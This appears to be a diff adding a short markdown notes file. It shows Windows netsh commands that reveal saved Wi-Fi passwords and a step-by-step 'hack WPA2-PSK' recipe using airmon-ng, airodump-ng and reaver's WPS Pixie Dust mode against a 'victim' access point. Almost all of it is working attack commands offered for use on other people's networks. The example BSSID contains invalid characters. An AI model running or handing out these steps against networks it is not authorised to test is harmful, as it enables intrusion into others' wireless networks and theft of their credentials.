@@ -1,0 +1,37 @@
+# Receive password to an already connected network
+
+1st: open COMMAND PROMPT
+
+2nd: type NETSH WLAN SHOW PROFILES
+
+3rd:type NETSH WLAN SHOW PROFILES wifi name
+
+4th:type NETSH WLAN SHOW PROFILES wifi name key=clear
+
+
+
+
+
+# WIRELESS LAN SECURITY AND PENETRATION TESTING MEGAPRIMER
+http://www.securitytube.net/groups?operation=view&groupId=9
+
+# Hack Wap2-psk using reaver method (kali linux).
+Step 1: Open Terminal. Type 
+~# ifconfig
+
+Step 2: Type the following commands on terminal.
+~# airmon-ng check kill
+~# airmon-ng check
+
+Step 3: Enable Monitor mode. Now, we use a tool called airmon-ng to create a virtual interface called mon. Just type:
+~# airmon-ng start wlan0 
+
+Step 4: Start capturing packets. we’ll use airodump-ng to capture the packets in the air. You’ll see the name of the wifi you want to hack.
+~# airodump-ng wlan0mon
+then press Ctrl+c
+
+Step5: Copy the BSSID of Victim. And write it on this command.
+~# reaver -i wlan0mon -b (BSSID) -vv -K 1
+For ex: reaver -i wlan0mon -b B0:5G:54:96:G7:70 -vv -K 1
+
+Password in [Reaver Test] [+] WPA PSK: 'Password'
